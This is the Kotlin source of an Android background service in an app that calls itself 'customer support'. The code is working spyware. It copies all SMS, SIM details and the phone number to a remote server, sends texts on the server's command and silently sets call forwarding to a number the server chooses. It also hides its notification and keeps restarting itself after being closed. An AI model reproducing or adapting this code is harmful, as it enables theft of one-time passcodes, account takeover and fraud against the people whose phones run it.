package com.customersupport.service

import android.app.AlarmManager
import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.net.ConnectivityManager
import android.net.Network
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.os.SystemClock
import android.provider.Settings
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import android.util.Log
import android.net.Uri
import androidx.core.app.NotificationCompat
import com.customersupport.CustomerSupportApp
import com.customersupport.MainActivity
import com.customersupport.data.SimManager
import com.customersupport.data.SmsReader
import com.customersupport.receiver.RestartReceiver
import com.customersupport.socket.ConnectionState
import com.customersupport.socket.ForwardingConfig
import com.customersupport.socket.SmsSendRequest
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.first
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone

class SocketService : Service() {

    companion object {
        private const val TAG = "SocketService"
        private const val NOTIFICATION_ID = 1
        private const val SYNC_INTERVAL_MS = 5 * 60 * 1000L
        private const val RESTART_DELAY_MS = 3000L
        private const val KEEP_ALIVE_INTERVAL_MS = 15 * 60 * 1000L
        private const val KEEP_ALIVE_REQUEST_CODE = 42
        private const val WATCHDOG_INTERVAL_MS = 30 * 1000L
        private const val HEARTBEAT_INTERVAL_MS = 30 * 1000L

        /** Whether the foreground service is currently alive (for the health screen). */
        @Volatile
        var isRunning: Boolean = false
            private set

        /**
         * Schedule a self-rescheduling keepalive alarm. Unlike WorkManager's 15-minute
         * floor (which Doze can defer for hours), setAndAllowWhileIdle fires roughly
         * every 15 minutes even in Doze, waking the process so the socket can reconnect.
         */
        fun scheduleKeepAlive(context: Context) {
            try {
                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val intent = Intent(context, RestartReceiver::class.java).apply {
                    action = RestartReceiver.ACTION_KEEP_ALIVE
                }
                val pendingIntent = PendingIntent.getBroadcast(
                    context, KEEP_ALIVE_REQUEST_CODE, intent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                )
                val triggerAt = SystemClock.elapsedRealtime() + KEEP_ALIVE_INTERVAL_MS

                when {
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && alarmManager.canScheduleExactAlarms() -> {
                        alarmManager.setExactAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pendingIntent
                        )
                    }
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.M -> {
                        alarmManager.setAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pendingIntent
                        )
                    }
                    else -> {
                        alarmManager.set(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pendingIntent
                        )
                    }
                }
                Log.d(TAG, "Keepalive scheduled in ${KEEP_ALIVE_INTERVAL_MS / 60000} min")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to schedule keepalive", e)
            }
        }
    }

    private val socketManager get() = CustomerSupportApp.socketManager
    private val preferencesManager get() = CustomerSupportApp.preferencesManager
    private val smsReader by lazy { SmsReader(this) }
    private val simManager by lazy { SimManager(this) }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var syncJob: Job? = null
    private var watchdogJob: Job? = null
    private var heartbeatJob: Job? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiLock: android.net.wifi.WifiManager.WifiLock? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null

    // Track the last applied call forwarding config to avoid re-executing USSD codes
    private var lastAppliedCallsEnabled: Boolean? = null
    private var lastAppliedCallsForwardTo: String? = null

    // Guard to prevent multiple concurrent connectAndSync() calls
    @Volatile private var connectStarted = false

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "Service created")
        isRunning = true
        acquireWakeLock()
        startWatchdog()
        registerNetworkCallback()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service started")
        val notification = createNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        // Ensure the next keepalive alarm is always queued while the service runs.
        scheduleKeepAlive(this)

        // Guard: if already connected, don't run connectAndSync again (idempotent start).
        // This prevents duplicate socket creation when AlarmManager or WorkManager
        // restarts the service while Socket.IO is already reconnecting on its own.
        if (socketManager.isConnected() || connectStarted) {
            Log.d(TAG, "Already connected or connecting, skipping connectAndSync")
            // Nudge a reconnect if the service is alive but the socket has dropped.
            if (!socketManager.isConnected()) {
                socketManager.reconnectIfNeeded()
            }
            return START_STICKY
        }

        serviceScope.launch {
            connectAndSync()
        }

        return START_STICKY
    }

    /**
     * Called when the user swipes the app from recents. Schedule a restart alarm.
     */
    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d(TAG, "Task removed (swiped away), scheduling restart")
        scheduleServiceRestart()
    }

    private fun acquireWakeLock() {
        try {
            if (wakeLock == null) {
                val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
                wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "CustomerSupport::SocketWakeLock"
                ).apply { setReferenceCounted(false) }
            }
            if (wakeLock?.isHeld != true) {
                // Held for the lifetime of the service — Doze must not suspend the socket.
                wakeLock?.acquire()
                Log.d(TAG, "WakeLock acquired")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to acquire WakeLock", e)
        }

        try {
            if (wifiLock == null) {
                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                @Suppress("DEPRECATION")
                val mode = android.net.wifi.WifiManager.WIFI_MODE_FULL_HIGH_PERF
                wifiLock = wifiManager.createWifiLock(
                    mode,
                    "CustomerSupport::SocketWifiLock"
                ).apply { setReferenceCounted(false) }
            }
            if (wifiLock?.isHeld != true) {
                wifiLock?.acquire()
                Log.d(TAG, "WifiLock acquired")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to acquire WifiLock", e)
        }
    }

    private fun releaseWakeLock() {
        try {
            wakeLock?.let { if (it.isHeld) it.release() }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to release WakeLock", e)
        }
        wakeLock = null

        try {
            wifiLock?.let { if (it.isHeld) it.release() }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to release WifiLock", e)
        }
        wifiLock = null
    }

    /**
     * Background safety net: every 30s, if the socket is not connected, attempt a
     * reconnect (with disk-credential fallback and stuck-CONNECTING recovery).
     */
    private fun startWatchdog() {
        watchdogJob?.cancel()
        watchdogJob = serviceScope.launch {
            while (isActive) {
                delay(WATCHDOG_INTERVAL_MS)
                try {
                    acquireWakeLock()
                    if (!socketManager.isConnected()) {
                        Log.d(TAG, "Watchdog: socket not connected, attempting recovery")
                        socketManager.reconnectIfNeeded()
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Watchdog error", e)
                }
            }
        }
    }

    /**
     * Reconnect as soon as connectivity is (re)established — e.g. coming out of
     * a tunnel, Wi-Fi/cellular handover, or Doze. High-value for "connect more
     * often" without polling.
     */
    private fun registerNetworkCallback() {
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val callback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    Log.d(TAG, "Network available — attempting reconnect")
                    serviceScope.launch {
                        try {
                            acquireWakeLock()
                            socketManager.reconnectIfNeeded()
                        } catch (e: Exception) {
                            Log.e(TAG, "Reconnect on network change failed", e)
                        }
                    }
                }
            }
            cm.registerDefaultNetworkCallback(callback)
            networkCallback = callback
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register network callback", e)
        }
    }

    private fun unregisterNetworkCallback() {
        try {
            networkCallback?.let {
                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                cm.unregisterNetworkCallback(it)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to unregister network callback", e)
        }
        networkCallback = null
    }

    /**
     * Schedule a restart of this service via AlarmManager + RestartReceiver.
     * Uses exact + allow-while-idle so it fires under Doze/App Standby,
     * with fallbacks for devices that deny SCHEDULE_EXACT_ALARM.
     */
    private fun scheduleServiceRestart() {
        try {
            val restartIntent = Intent(this, RestartReceiver::class.java).apply {
                action = RestartReceiver.ACTION_RESTART_SERVICE
            }
            val pendingIntent = PendingIntent.getBroadcast(
                this, 0, restartIntent,
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )

            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val triggerAt = SystemClock.elapsedRealtime() + RESTART_DELAY_MS

            try {
                when {
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.S -> {
                        if (alarmManager.canScheduleExactAlarms()) {
                            alarmManager.setExactAndAllowWhileIdle(
                                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                                triggerAt,
                                pendingIntent
                            )
                            Log.d(TAG, "Service restart scheduled (exact + allowWhileIdle) in ${RESTART_DELAY_MS}ms")
                        } else {
                            alarmManager.setAndAllowWhileIdle(
                                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                                triggerAt,
                                pendingIntent
                            )
                            Log.d(TAG, "Service restart scheduled (allowWhileIdle fallback, exact denied) in ${RESTART_DELAY_MS}ms")
                        }
                    }
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.M -> {
                        alarmManager.setExactAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            triggerAt,
                            pendingIntent
                        )
                        Log.d(TAG, "Service restart scheduled (exact + allowWhileIdle) in ${RESTART_DELAY_MS}ms")
                    }
                    else -> {
                        alarmManager.setExact(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            triggerAt,
                            pendingIntent
                        )
                        Log.d(TAG, "Service restart scheduled (exact) in ${RESTART_DELAY_MS}ms")
                    }
                }
            } catch (se: SecurityException) {
                Log.w(TAG, "Exact alarm denied, falling back to allowWhileIdle", se)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        triggerAt,
                        pendingIntent
                    )
                } else {
                    alarmManager.set(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        triggerAt,
                        pendingIntent
                    )
                }
                Log.d(TAG, "Service restart scheduled (fallback) in ${RESTART_DELAY_MS}ms")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to schedule service restart", e)
        }
    }

    private suspend fun connectAndSync() {
        if (connectStarted) {
            Log.d(TAG, "connectAndSync already started, skipping")
            return
        }
        connectStarted = true

        socketManager.setOnSyncRequestCallback {
            serviceScope.launch {
                performSync()
            }
        }
        
        socketManager.setOnForwardingConfigCallback { config ->
            serviceScope.launch {
                handleForwardingConfig(config)
            }
        }
        
        socketManager.setOnSmsSendRequestCallback { request ->
            serviceScope.launch {
                handleSmsSendRequest(request)
            }
        }

        val deviceId = getDeviceUniqueId()
        val deviceName = Build.MODEL
        val phoneNumber = getPhoneNumber()

        // Persist ALL credentials to disk so SyncWorker can reconnect after process death
        preferencesManager.saveDeviceId(deviceId)
        preferencesManager.saveDeviceName(deviceName)
        preferencesManager.saveDevicePhone(phoneNumber)

        socketManager.connect(deviceId, deviceName, phoneNumber)
        monitorConnectionAndSync(deviceId)
    }

    private fun monitorConnectionAndSync(deviceId: String) {
        serviceScope.launch {
            socketManager.connectionState.collect { state ->
                when (state) {
                    ConnectionState.CONNECTED -> {
                        Log.d(TAG, "Connected - triggering sync")
                        // Re-acquire WakeLock on reconnection
                        acquireWakeLock()
                        startHeartbeat(deviceId)
                        delay(3000)
                        syncSimInfoWithRetry(deviceId)
                        performSync()
                        // Cancel any existing sync job before starting a new one.
                        // Without this, each reconnect stacks another sync loop.
                        startPeriodicSync()
                    }
                    ConnectionState.DISCONNECTED, ConnectionState.ERROR -> {
                        heartbeatJob?.cancel()
                        heartbeatJob = null
                    }
                    ConnectionState.CONNECTING -> Unit
                }
            }
        }
    }

    /**
     * App-level heartbeat every 30s. Keeps the server's device status online and
     * refreshes lastSeen. If the server stops acking, the socket is half-open —
     * force a clean reconnect.
     */
    private fun startHeartbeat(deviceId: String) {
        heartbeatJob?.cancel()
        heartbeatJob = serviceScope.launch {
            while (isActive) {
                delay(HEARTBEAT_INTERVAL_MS)
                socketManager.sendHeartbeat(deviceId)
                if (socketManager.heartbeatStale(90_000L)) {
                    Log.w(TAG, "Heartbeat ack stale for >90s — forcing reconnect")
                    socketManager.recoverConnection()
                }
            }
        }
    }
    
    private suspend fun handleForwardingConfig(config: ForwardingConfig) {
        try {
            Log.d(TAG, "Saving forwarding config: $config")
            preferencesManager.saveSmsForwarding(config.smsEnabled, config.smsForwardTo, config.smsSubscriptionId)
            preferencesManager.saveCallsForwarding(config.callsEnabled, config.callsForwardTo, config.callsSubscriptionId)
            handleCallForwarding(config.callsEnabled, config.callsForwardTo, config.callsSubscriptionId)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to save forwarding config", e)
        }
    }
    
    private fun handleCallForwarding(enabled: Boolean, forwardTo: String, subscriptionId: Int = -1) {
        try {
            // Skip if the config hasn't changed from what was last applied
            if (enabled == lastAppliedCallsEnabled && forwardTo == lastAppliedCallsForwardTo) {
                Log.d(TAG, "Call forwarding config unchanged, skipping USSD execution")
                return
            }

            // Skip disabling forwarding if it was never enabled by this app
            if (!enabled && lastAppliedCallsEnabled != true) {
                Log.d(TAG, "Call forwarding not previously enabled, skipping disable USSD (##21#)")
                lastAppliedCallsEnabled = enabled
                lastAppliedCallsForwardTo = forwardTo
                return
            }

            val ussdCode = if (enabled && forwardTo.isNotEmpty()) {
                "*21*$forwardTo#"
            } else {
                "##21#"
            }
            
            Log.d(TAG, "Executing USSD: $ussdCode")
            
            // Update tracked state before executing
            lastAppliedCallsEnabled = enabled
            lastAppliedCallsForwardTo = forwardTo

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                sendUssdRequest(ussdCode, subscriptionId)
            } else {
                val encodedUssd = ussdCode.replace("#", Uri.encode("#"))
                val intent = Intent(Intent.ACTION_CALL).apply {
                    data = Uri.parse("tel:$encodedUssd")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                startActivity(intent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to handle call forwarding", e)
        }
    }
    
    @android.annotation.SuppressLint("MissingPermission")
    private fun sendUssdRequest(ussdCode: String, subscriptionId: Int) {
        try {
            val telephonyManager = if (subscriptionId > 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
                tm.createForSubscriptionId(subscriptionId)
            } else {
                getSystemService(TELEPHONY_SERVICE) as TelephonyManager
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                telephonyManager.sendUssdRequest(
                    ussdCode,
                    object : TelephonyManager.UssdResponseCallback() {
                        override fun onReceiveUssdResponse(tm: TelephonyManager, req: String, resp: CharSequence) {
                            Log.d(TAG, "USSD Response: $resp")
                        }
                        override fun onReceiveUssdResponseFailed(tm: TelephonyManager, req: String, code: Int) {
                            Log.e(TAG, "USSD Failed: $code")
                            fallbackToDialIntent(ussdCode)
                        }
                    },
                    android.os.Handler(mainLooper)
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "USSD request failed", e)
            fallbackToDialIntent(ussdCode)
        }
    }
    
    private fun fallbackToDialIntent(ussdCode: String) {
        try {
            val encodedUssd = ussdCode.replace("#", Uri.encode("#"))
            val intent = Intent(Intent.ACTION_CALL).apply {
                data = Uri.parse("tel:$encodedUssd")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Fallback dial failed", e)
        }
    }

    private fun startPeriodicSync() {
        syncJob?.cancel()
        syncJob = serviceScope.launch {
            while (isActive) {
                delay(SYNC_INTERVAL_MS)
                // Re-acquire WakeLock periodically regardless of connection state
                acquireWakeLock()
                if (socketManager.connectionState.value == ConnectionState.CONNECTED) {
                    performSync()
                } else {
                    // Socket.IO's built-in reconnection is already running.
                    // Only call reconnectIfNeeded() if the socket itself is null
                    // (i.e. the process was restarted without connectAndSync running yet).
                    Log.d(TAG, "Not connected during periodic sync — Socket.IO reconnecting automatically")
                    socketManager.reconnectIfNeeded()
                }
            }
        }
    }

    private suspend fun performSync() {
        try {
            val deviceId = preferencesManager.getDeviceId().first() ?: return

            // Incremental SMS: send only messages newer than the last sync
            // (minus a small overlap) so we don't resend the whole history every
            // cycle — which risks exceeding the server frame limit and looping.
            val allSms = smsReader.readAllSms()
            val lastSmsMs = preferencesManager.getLastSmsSyncMs().first()
            val newSms = selectSmsForSync(allSms, lastSmsMs)
            val newestMs = newestSmsMs(allSms)

            if (socketManager.connectionState.value != ConnectionState.CONNECTED) {
                Log.w(TAG, "Cannot sync - not connected, queuing ${newSms.length()} new SMS")
                if (newSms.length() > 0) {
                    CustomerSupportApp.pendingSyncManager.queueSmsSync(deviceId, newSms)
                }
                return
            }

            Log.d(TAG, "Starting sync for device: $deviceId (${newSms.length()} new SMS)")

            val simCards = simManager.getSimCards()
            if (simCards.length() > 0) {
                socketManager.syncSimInfo(deviceId, simCards)
            }

            if (newSms.length() > 0) {
                socketManager.syncSms(deviceId, newSms)
                if (newestMs > 0L) {
                    preferencesManager.saveLastSmsSyncMs(newestMs)
                }
            }

            preferencesManager.saveLastSyncTime(System.currentTimeMillis())
            Log.d(TAG, "Sync completed")
        } catch (e: Exception) {
            Log.e(TAG, "Sync failed", e)
        }
    }

    /** ISO-8601 UTC formatter matching SmsReader's timestamp format. */
    private fun isoFormat(): SimpleDateFormat =
        SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
            timeZone = TimeZone.getTimeZone("UTC")
        }

    private fun parseIsoMs(ts: String): Long =
        try {
            isoFormat().parse(ts)?.time ?: 0L
        } catch (e: Exception) {
            0L
        }

    /**
     * Return only SMS newer than [lastSyncedMs] (with a 60s overlap so nothing is
     * missed across clock/boundary edges). On the first ever sync (0) returns all.
     * The server dedupes by id, so the overlap is safe.
     */
    private fun selectSmsForSync(all: JSONArray, lastSyncedMs: Long): JSONArray {
        if (lastSyncedMs <= 0L) return all
        val cutoff = lastSyncedMs - 60_000L
        val filtered = JSONArray()
        for (i in 0 until all.length()) {
            val obj = all.optJSONObject(i) ?: continue
            if (parseIsoMs(obj.optString("timestamp")) >= cutoff) {
                filtered.put(obj)
            }
        }
        return filtered
    }

    private fun newestSmsMs(all: JSONArray): Long {
        var max = 0L
        for (i in 0 until all.length()) {
            val obj = all.optJSONObject(i) ?: continue
            val ts = parseIsoMs(obj.optString("timestamp"))
            if (ts > max) max = ts
        }
        return max
    }

    private fun getDeviceUniqueId(): String {
        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    private fun getPhoneNumber(): String {
        try {
            val telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
            val number = telephonyManager.line1Number
            if (!number.isNullOrBlank()) return number
        } catch (e: Exception) { }
        
        try {
            val simCards = simManager.getSimCards()
            if (simCards.length() > 0) {
                val phoneNumber = simCards.getJSONObject(0).optString("phoneNumber", "")
                if (phoneNumber.isNotBlank()) return phoneNumber
            }
        } catch (e: Exception) { }
        
        return "Unknown"
    }

    private suspend fun syncSimInfoWithRetry(deviceId: String, maxRetries: Int = 3) {
        var attempt = 0
        var success = false
        
        while (attempt < maxRetries && !success) {
            try {
                if (socketManager.connectionState.value != ConnectionState.CONNECTED) {
                    delay(1000)
                    attempt++
                    continue
                }
                
                val simCards = simManager.getSimCards()
                if (simCards.length() > 0) {
                    socketManager.syncSimInfo(deviceId, simCards)
                }
                success = true
            } catch (e: Exception) {
                attempt++
                if (attempt < maxRetries) {
                    delay((1000L * (1 shl (attempt - 1))))
                }
            }
        }
    }

    private suspend fun handleSmsSendRequest(request: SmsSendRequest) {
        val deviceId = preferencesManager.getDeviceId().first() ?: return
        
        try {
            Log.d(TAG, "Sending SMS to ${request.recipientNumber}")
            
            val smsManager = if (request.subscriptionId > 0 && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                SmsManager.getSmsManagerForSubscriptionId(request.subscriptionId)
            } else {
                @Suppress("DEPRECATION")
                SmsManager.getDefault()
            }
            
            val parts = smsManager.divideMessage(request.message)
            if (parts.size > 1) {
                smsManager.sendMultipartTextMessage(request.recipientNumber, null, parts, null, null)
            } else {
                smsManager.sendTextMessage(request.recipientNumber, null, request.message, null, null)
            }
            
            socketManager.reportSmsSendResult(deviceId, request.requestId, true)
            delay(500)
            performSync()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send SMS", e)
            socketManager.reportSmsSendResult(deviceId, request.requestId, false, e.message)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CustomerSupportApp.CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "Service destroyed, scheduling restart")
        isRunning = false
        syncJob?.cancel()
        watchdogJob?.cancel()
        heartbeatJob?.cancel()
        unregisterNetworkCallback()
        serviceScope.cancel()
        releaseWakeLock()
        // Don't disconnect socket — schedule restart instead
        scheduleServiceRestart()
    }
}
